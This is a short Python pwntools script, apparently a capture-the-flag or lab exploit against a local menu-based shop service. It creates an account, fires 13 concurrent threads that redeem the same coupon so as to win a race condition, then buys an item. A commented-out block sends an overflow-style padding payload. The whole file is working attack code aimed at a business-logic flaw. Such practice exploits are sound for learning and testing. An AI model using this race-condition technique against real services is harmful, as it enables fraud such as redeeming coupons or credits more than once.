from pwn import *

import threading

# # 타겟 함수
# # def attack(idx):
#     # r = remote("127.0.0.1", 1337)
#     payload = b"A" * 64 + b"B" * 8
#     r.sendline(payload)
#     print(f"[+] Thread {idx} sent payload")
#     r.close()


host= "127.0.0.1"
port = 8888




# name: bytes
# job: bytes
# age: int
def createAcount(name):
    r= remote(host,port)
    r.recvuntil(b">")
    r.sendline(b"1")
    r.recvuntil(b">")
    r.sendline(str(name).encode())
    r.close()

def useCoupon(userId,couponId):
    r = remote(host,port)
    r.recvuntil(b">")
    r.sendline(b"3")
    r.recvuntil(b">")
    r.sendline(str(userId).encode())
    r.recvuntil(b">")
    r.sendline(str(couponId).encode())
    print("over")
    r.close()

def viewAccount(userId):
    r = remote(host,port)
    r.recvuntil(b">")
    r.sendline(b"2")
    r.recvuntil(b">")
    r.sendline(str(userId).encode())
    print("view")

def buyItem(userId):
    r = remote(host,port)
    r.recvuntil(b">")
    r.sendline(b"4")
    r.recvuntil(b">")
    r.sendline(str(userId).encode())
    line = r.recvline(timeout=5)
    print(line)
    print("buy")



createAcount("Jin")



threads = []
for i in range(13):  # 동시에 10개 프로세스 실행
    t = threading.Thread(target=useCoupon, args=(0, 1))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
#viewAccount(0)
buyItem(0)


